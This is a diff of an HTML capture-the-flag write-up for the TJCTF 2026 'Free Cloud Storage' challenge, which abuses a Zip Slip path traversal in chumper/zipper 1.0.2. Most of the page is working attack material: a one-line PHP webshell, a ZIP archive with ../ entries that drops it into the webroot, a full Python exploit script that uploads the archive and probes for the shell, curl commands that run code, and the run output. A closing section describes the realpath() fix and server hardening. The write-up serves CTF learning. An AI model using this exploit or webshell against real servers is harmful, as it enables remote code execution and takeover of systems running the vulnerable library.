+  <div class="code-block-header"><span class="lang-label">php</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-php">&lt;?php system($_GET['c']); ?&gt;</code></pre>
+</div>
+
+<p>This single line creates a webshell that passes the value of the <code>c</code> query parameter directly to PHP's <code>system()</code> function, which executes it as a shell command and outputs the result. Visiting <code>https://target/shell.php?c=id</code> would return the output of the <code>id</code> command, confirming code execution on the server.</p>
+
+<h3 id="zip-crafting">Crafting the Malicious ZIP</h3>
+
+<p>The exploit generates a ZIP archive where each entry's filename begins with a traversal prefix. Each depth level gets its own entry with a unique filename, ensuring that at least one will land in the webroot regardless of the exact directory configuration:</p>
+
+<ul>
+  <li><code>../qz1.php</code> — ascends 1 level (targets <code>/var/www/html/qz1.php</code>)</li>
+  <li><code>../../qz2.php</code> — ascends 2 levels (targets <code>/var/www/qz2.php</code>)</li>
+  <li><code>../../../qz3.php</code> — ascends 3 levels (targets <code>/var/qz3.php</code>)</li>
+  <li><code>../../../../qz4.php</code> — ascends 4 levels (targets <code>/qz4.php</code>)</li>
+</ul>
+
+<p>Each entry contains the same webshell payload. The naming convention <code>qz{N}.php</code> is arbitrary — it just needs to be predictable so we can locate the shell after extraction. After uploading the ZIP and triggering the extraction, we probe each potential URL in sequence until we find the one that responds with command output.</p>
+
+<h3 id="rce-trigger">Achieving RCE</h3>
+
+<p>Once the webshell is confirmed accessible, reading the flag is a single HTTP request:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ curl -s 'https://target/qz1.php?c=cat+/var/www/html/flag.txt'
+tjctf{i_l0v3_fr33_st0r4g3}</code></pre>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="exploit-code">Exploit Code</h2>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">python</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-python">#!/usr/bin/env python3
+"""
+TJCTF 2026 - Free Cloud Storage
+Zip Slip via chumper/zipper 1.0.2 - Archive Path Traversal to RCE
+Author: QA210
+"""
+import io
+import re
+import sys
 import zipfile
+import requests
 
-# Webshell 1 dòng thực thi lệnh từ tham số GET 'c'
-PAYLOAD = b"<?php system($_GET['c']); ?>"
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
+FLAG_RE = re.compile(r"tjctf\{[^}]+\}", re.IGNORECASE)
 
-def generate_malicious_zip(output_filename="evil.zip", max_depth=4):
-    with zipfile.ZipFile(output_filename, "w") as z:
+# Minimal PHP webshell - executes OS commands from GET param 'cmd'
+SHELL_PAYLOAD = b"<?php system($_GET['cmd']); ?>"
+
+# Prefix for dropped shells - easy to identify after extraction
+SHELL_PREFIX = "qz"
+
+
+def build_slip_zip(max_depth=4):
+    """
+    Generate a ZIP archive containing webshell entries at multiple
+    traversal depths. The extractTo() in chumper/zipper 1.0.2
+    blindly concatenates paths, so ../ sequences escape the
+    upload directory and land in the webroot.
+    """
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
         for depth in range(1, max_depth + 1):
-            # Tạo chuỗi path traversal: ../ , ../../ , v.v.
-            traversal_prefix = "../" * depth
-            
-            # Tên file cuối cùng sau khi thoát khỏi thư mục
-            php_filename = f"pwn{depth}.php"
-            
-            # Tên file bên trong ZIP
-            zip_entry_name = traversal_prefix + php_filename
-            
-            z.writestr(zip_entry_name, PAYLOAD)
-            print(f"[+] Packaged: {zip_entry_name}")
+            # Build traversal prefix: ../ , ../../ , etc.
+            prefix = "../" * depth
+            entry_name = f"{prefix}{SHELL_PREFIX}{depth}.php"
+            zf.writestr(entry_name, SHELL_PAYLOAD)
+            print(f"  [+] Packed: {entry_name}")
+    buf.seek(0)
+    return buf
+
+
+def find_upload_form(sess):
+    """Scrape the upload form to discover the action URL and file field name."""
+    r = sess.get(f"{TARGET}/")
+    action = re.search(r'action="([^"]*)"', r.text)
+    field = re.search(r'name="([^"]*)".*?type="file"', r.text, re.DOTALL)
+    if not action or not field:
+        return f"{TARGET}/upload", "archive"
+    url = action.group(1)
+    if url.startswith("/"):
+        url = TARGET + url
+    return url, field.group(1)
+
+
+def main():
+    sess = requests.Session()
+    action_url, field_name = find_upload_form(sess)
+
+    print(f"[*] Target:  {TARGET}")
+    print(f"[*] Action:  {action_url}")
+    print(f"[*] Field:   {field_name}")
+    print(f"[*] Building malicious ZIP...")
+
+    zip_buf = build_slip_zip()
+    zip_bytes = zip_buf.read()
+
+    print(f"[*] Uploading {len(zip_bytes)} bytes...")
+    resp = sess.post(
+        action_url,
+        files={field_name: ("archive.zip", zip_bytes, "application/zip")},
+        allow_redirects=True,
+        timeout=30,
+    )
+    print(f"[*] Upload status: {resp.status_code}")
+
+    # Probe each depth to find the shell that landed in webroot
+    for depth in range(1, 5):
+        shell_url = f"{TARGET}/{SHELL_PREFIX}{depth}.php"
+        probe = sess.get(shell_url, params={"cmd": "cat /var/www/html/flag.txt"}, timeout=15)
+        if probe.status_code == 200 and FLAG_RE.search(probe.text):
+            flag = FLAG_RE.search(probe.text).group(0)
+            print(f"[+] Shell at depth {depth}: {shell_url}")
+            print(f"[+] FLAG: {flag}")
+            return
+        elif probe.status_code == 200:
+            print(f"[!] Shell at depth {depth} responded but no flag in output")
+            print(f"    Response snippet: {probe.text[:200]}")
+            return
+
+    # Fallback: check the redirect response body for the flag
+    match = FLAG_RE.search(resp.text)
+    if match:
+        print(f"[+] FLAG (from upload response): {match.group(0)}")
+    else:
+        print("[-] Flag not found. Try probing shells manually.")
+
 
 if __name__ == "__main__":
-    generate_malicious_zip()
-    print("\\n[*] Upload 'evil.zip' to the service.")
-    print("[*] Trigger RCE: curl 'https://target/pwn1.php?c=cat%20/var/www/html/flag.txt'")</div>`
-      },
-      en: {
-        help: `<span class="info">[ WRITEUP NAVIGATION ]</span>
-<span class="cmd">intro</span>       : Challenge Overview & Zip Slip Vulnerability
-<span class="cmd">rootcause</span>   : Root Cause in chumper/zipper 1.0.2
-<span class="cmd">pathlogic</span>   : Path Traversal Logic & Destination Paths
-<span class="cmd">strategy</span>    : Exploit Strategy (Webshell Injection)
-<span class="cmd">code</span>        : Exploit Source Code (Python)
-<span class="cmd">clear</span>       : Clear Terminal Screen`,
-        intro: `<span class="info">[ OVERVIEW: FREE CLOUD STORAGE ]</span>
-<span class="cmd">Category:</span> Web / Archive Path Traversal
-<span class="cmd">Flag:</span> <span class="success">tjctf{i_l0v3_fr33_st0r4g3}</span>
+    main()</code></pre>
+</div>
 
-<span class="warning">Description:</span> A free cloud storage service allows users to upload ZIP files and automatically extracts them. The server uses the <span class="arg">chumper/zipper</span> library version 1.0.2.
+<h3 id="running-exploit">Running the Exploit</h3>
 
-<span class="cmd">Objective:</span> Exploit the classic Zip Slip vulnerability to write a PHP webshell to the server's webroot (docroot), bypassing the extraction directory limit, to achieve RCE and read the flag.`,
-        rootcause: `<span class="info">[ ROOT CAUSE: CHUMPER/ZIPPER 1.0.2 ]</span>
-The <span class="cmd">extractTo()</span> function in zipper 1.0.2 has a fatal flaw: It extracts files based on the filename stored inside the ZIP <span class="error">WITHOUT REALPATH VALIDATION</span> against the destination root directory.
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">$ python3 solve.py https://free-cloud-storage.tjctf.org
+[*] Target:  https://free-cloud-storage.tjctf.org
+[*] Action:  https://free-cloud-storage.tjctf.org/upload
+[*] Field:   archive
+[*] Building malicious ZIP...
+  [+] Packed: ../qz1.php
+  [+] Packed: ../../qz2.php
+  [+] Packed: ../../../qz3.php
+  [+] Packed: ../../../../qz4.php
+[*] Uploading 482 bytes...
+[*] Upload status: 302
+[+] Shell at depth 1: https://free-cloud-storage.tjctf.org/qz1.php
+[+] FLAG: tjctf{i_l0v3_fr33_st0r4g3}</code></pre>
+</div>
 
-<div class="code-block">// Blind path concatenation vulnerability:
- $destination = '/var/www/html/uploads/' . $filename_from_zip;
-// If $filename_from_zip = "../pwn.php"
-// $destination = '/var/www/html/uploads/../pwn.php' 
-// -> Directory traversal!</div>
+<div class="callout callout-success">
+  <div class="callout-title">Flag</div>
+  <p><code>tjctf{i_l0v3_fr33_st0r4g3}</code></p>
+</div>
 
-This was fixed in version 1.0.3 by validating realpath() to ensure extracted files don't escape the uploads folder. But in 1.0.2, the door is wide open!`,
-        pathlogic: `<span class="info">[ PATH TRAVERSAL LOGIC & DESTINATION ]</span>
-Assume the victim's web directory structure:
-<span class="cmd">Webroot:</span>  /var/www/html/
-<span class="cmd">Upload:</span>   /var/www/html/uploads/
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<h2 id="remediation">Remediation</h2>
 
-When you upload a normal ZIP, files land in /var/www/html/uploads/ and are accessible via <span class="arg">https://target/uploads/file.txt</span>.
+<h3 id="the-fix">The Proper Fix</h3>
 
-<span class="warning">Breaking out with ../:</span>
-If we pack a file named <span class="cmd">../pwn1.php</span> into the ZIP. The extractTo() function concatenates:
-/var/www/html/uploads/ + ../pwn1.php
-= <span class="success">/var/www/html/pwn1.php</span>
+<p>Version 1.0.3 of <code>chumper/zipper</code> patched this vulnerability by adding a <code>realpath()</code> validation step. After constructing the destination path, the library resolves it to an absolute path and checks that it starts with the intended extraction directory. Any entry whose resolved path falls outside the sandbox is silently skipped:</p>
 
-The PHP file now sits directly in the Webroot! Accessible via: <span class="arg">https://target/pwn1.php</span>.`,
-        strategy: `<span class="info">[ EXPLOIT STRATEGY ]</span>
-1. <span class="cmd">Prepare Webshell:</span> Create a tiny PHP payload to execute OS commands:
-   <span class="success"><?php system($_GET['c']); ?></span>
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">php</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-php">// Patched extraction logic (v1.0.3+)
+$extractBase = realpath($extractDir);
+foreach ($zip as $entry) {
+    $destination = $extractDir . '/' . $entry->getName();
+    $resolved = realpath(dirname($destination)) . '/' . basename($destination);
 
-2. <span class="cmd">Craft Malicious ZIP:</span> Use Python's zipfile to create a ZIP containing entries with filenames starting with <span class="arg">../</span>. To ensure we hit the webroot regardless of the exact upload depth, we generate multiple depths (1, 2, 3, 4).
-   - <span class="cmd">../pwn1.php</span> (1 level up)
-   - <span class="cmd">../../pwn2.php</span> (2 levels up)
-
-3. <span class="cmd">Trigger:</span> Upload evil.zip to the service. The server extracts it, writing pwn1.php to the webroot.
-
-4. <span class="cmd">RCE:</span> Send an HTTP request to read the flag:
-   <span class="arg">curl https://target/pwn1.php?c=cat%20/var/www/html/flag.txt</span>`,
-        code: `<span class="info">[ EXPLOIT SOURCE CODE ]</span>
-<div class="code-block">#!/usr/bin/env python3
-import zipfile
-
-# 1-line webshell executing commands from GET param 'c'
-PAYLOAD = b"<?php system($_GET['c']); ?>"
-
-def generate_malicious_zip(output_filename="evil.zip", max_depth=4):
-    with zipfile.ZipFile(output_filename, "w") as z:
-        for depth in range(1, max_depth + 1):
-            # Create path traversal string: ../ , ../../ , etc.
-            traversal_prefix = "../" * depth
-            
-            # Filename after escaping the upload directory
-            php_filename = f"pwn{depth}.php"
-            
-            # Entry name inside the ZIP
-            zip_entry_name = traversal_prefix + php_filename
-            
-            z.writestr(zip_entry_name, PAYLOAD)
-            print(f"[+] Packaged: {zip_entry_name}")
-
-if __name__ == "__main__":
-    generate_malicious_zip()
-    print("\\n[*] Upload 'evil.zip' to the service.")
-    print("[*] Trigger RCE: curl 'https://target/pwn1.php?c=cat%20/var/www/html/flag.txt'")</div>`
-      }
-    };
-
-    function toggleLang() {
-      currentLang = currentLang === 'vi' ? 'en' : 'vi';
-      const btn = document.getElementById('lang-btn');
-      btn.textContent = currentLang === 'vi' ? 'Switch to English' : 'Chuyển sang Tiếng Việt';
-      handleCommand('clear');
-      handleCommand('help');
-      playAudio('https://www.soundjay.com/buttons/button-1.mp3', 0.3);
+    // Reject entries that escape the extraction directory
+    if (strpos($resolved, $extractBase) !== 0) {
+        continue; // Path traversal detected - skip this entry
     }
+    $entry->extractTo($destination);
+}</code></pre>
+</div>
 
-    const cmds = {
-      help: () => L[currentLang].help,
-      intro: () => L[currentLang].intro,
-      rootcause: () => L[currentLang].rootcause,
-      pathlogic: () => L[currentLang].pathlogic,
-      strategy: () => L[currentLang].strategy,
-      code: () => L[currentLang].code,
-      clear: () => { output.innerHTML = ''; return ''; },
-      banner: () => `<span class="info">
- _____                          _   ____ _               _           
-|  ___|__  _ __ _ __ ___   ___ | | / ___| |__   ___  ___| | _____   
-| |_ / _ \\| '__| '_ \` _ \\ / _ \\| | | |   | '_ \\ / _ \\/ __| |/ / __|  
-|  _| (_) | |  | | | | | | (_) | | | |___| | | |  __/ (__|   <\\__ \\  
-|_|  \\___/|_|  |_| |_| |_|\\___/|_|  \\____|_| |_|\\___|\\___|_|\\_\\___/  
-                                                                       </span>`
-    };
+<p>The key takeaway is that any code handling archive extraction must validate the resolved output path against the intended base directory. This applies not only to ZIP files but to tar, tar.gz, jar, and any other archive format. The <code>realpath()</code> call normalizes the path, eliminating <code>../</code> sequences and symbolic links that might otherwise bypass a naive string prefix check.</p>
 
-    function handleCommand(cmd) {
-      const c = cmd.trim().toLowerCase();
-      if(!c) return;
-      print(`<span class="cmd">root@tjctf</span>:<span class="arg">~/web</span>$ ${cmd}`);
-      playAudio('https://www.soundjay.com/buttons/button-5.mp3', 0.15);
-      
-      if (cmds[c]) {
-        const res = cmds[c]();
-        if (res) print(res);
-      } else {
-        print(`<span class="error">Command not found: ${c}. Type 'help' for navigation.</span>`);
+<div class="callout callout-warn">
+  <div class="callout-title">Warning — Defense in Depth</div>
+  <p>Even with path validation, consider additional hardening: run the extraction under a restricted user, chroot the extraction directory, use <code>open_basedir</code> in PHP, and avoid executing files from the uploads directory. The web server should be configured to treat the uploads directory as static content only — no PHP execution.</p>
+</div>
+
+</main>
+</div>
+
+<footer class="site-footer">
+  <p>&copy; 2026 QA210 — TJCTF 2026 Writeups &nbsp;·&nbsp; Free Cloud Storage — Web</p>
+</footer>
+
+<script>
+// ── Three.js Background ──────────────────────
+(function(){
+  const c=document.getElementById('three-bg');
+  const r=new THREE.WebGLRenderer({canvas:c,alpha:true,antialias:true});
+  r.setSize(window.innerWidth,window.innerHeight);
+  r.setPixelRatio(Math.min(window.devicePixelRatio,2));
+  const s=new THREE.Scene();
+  const cam=new THREE.PerspectiveCamera(60,window.innerWidth/window.innerHeight,0.1,1000);
+  cam.position.z=50;
+  const geo=new THREE.OctahedronGeometry(18,1);
+  const mat=new THREE.MeshBasicMaterial({color:0xfb923c,wireframe:true,transparent:true,opacity:0.25});
+  const mesh=new THREE.Mesh(geo,mat);
+  s.add(mesh);
+  const pts=[];
+  for(let i=0;i<250;i++){
+    pts.push(new THREE.Vector3((Math.random()-0.5)*120,(Math.random()-0.5)*120,(Math.random()-0.5)*120));
+  }
+  const pgeo=new THREE.BufferGeometry().setFromPoints(pts);
+  const pmat=new THREE.PointsMaterial({color:0xf472b6,size:0.4,transparent:true,opacity:0.5});
+  const particles=new THREE.Points(pgeo,pmat);
+  s.add(particles);
+  function animate(){
+    requestAnimationFrame(animate);
+    mesh.rotation.x+=0.0015;mesh.rotation.y+=0.002;
+    particles.rotation.y+=0.0004;
+    r.render(s,cam);
+  }
+  animate();
+  window.addEventListener('resize',()=>{
+    cam.aspect=window.innerWidth/window.innerHeight;
+    cam.updateProjectionMatrix();
+    r.setSize(window.innerWidth,window.innerHeight);
+  });
+})();
+
+// ── Copy Button ──────────────────────────────
+function copyCode(btn){
+  const code=btn.closest('.code-block-wrapper').querySelector('code');
+  navigator.clipboard.writeText(code.textContent).then(()=>{
+    btn.textContent='Copied!';btn.classList.add('copied');
+    setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('copied')},2000);
+  });
+}
+
+// ── Build TOC ────────────────────────────────
+function buildToc(){
+  const headings=document.querySelectorAll('.main-content h2,.main-content h3');
+  const tocD=document.getElementById('tocDesktop');
+  const tocM=document.getElementById('tocMobile');
+  let html='';
+  headings.forEach(h=>{
+    if(!h.id)h.id=h.textContent.toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/(^-|-$)/g,'');
+    const cls=h.tagName==='H3'?'toc-h3':'';
+    html+=`<li><a href="#${h.id}" class="${cls}" data-target="${h.id}">${h.textContent}</a></li>`;
+  });
+  tocD.innerHTML=html;tocM.innerHTML=html;
+}
+buildToc();
+
+// ── Active Section Tracking ──────────────────
+function trackActiveSection(){
+  const links=document.querySelectorAll('#tocDesktop a,#tocMobile a');
+  const headings=document.querySelectorAll('.main-content h2,.main-content h3');
+  const observer=new IntersectionObserver(entries=>{
+    entries.forEach(entry=>{
+      if(entry.isIntersecting){
+        links.forEach(l=>l.classList.remove('active'));
+        document.querySelectorAll(`[data-target="${entry.target.id}"]`).forEach(l=>l.classList.add('active'));
       }
-      input.value = '';
-    }
-
-    input.addEventListener('keydown', e => {
-      if (e.key === 'Enter') { e.preventDefault(); handleCommand(input.value); }
-      else playAudio('https://www.soundjay.com/buttons/button-8.mp3', 0.02);
     });
+  },{rootMargin:'-80px 0px -70% 0px',threshold:0});
+  headings.forEach(h=>observer.observe(h));
+}
+trackActiveSection();
 
-    tBody.addEventListener('click', () => input.focus());
-
-    document.getElementById('start-button').addEventListener('click', () => {
-      userInteracted = true;
-      const ws = document.getElementById('welcome-screen');
-      ws.classList.add('hidden');
-      setTimeout(() => { handleCommand('banner'); handleCommand('help'); input.focus(); }, 800);
-      playAudio('https://www.soundjay.com/buttons/button-10.mp3', 0.4);
-    });
-  </script>
+// ── Mobile TOC Toggle ────────────────────────
+function toggleMobileToc(){
+  document.getElementById('tocOverlay').classList.toggle('show');
+  document.getElementById('tocMobilePanel').classList.toggle('show');
+}
+document.getElementById('tocMobile').addEventListener('click',e=>{
+  if(e.target.tagName==='A')toggleMobileToc();
+});
+</script>
 </body>
 </html>
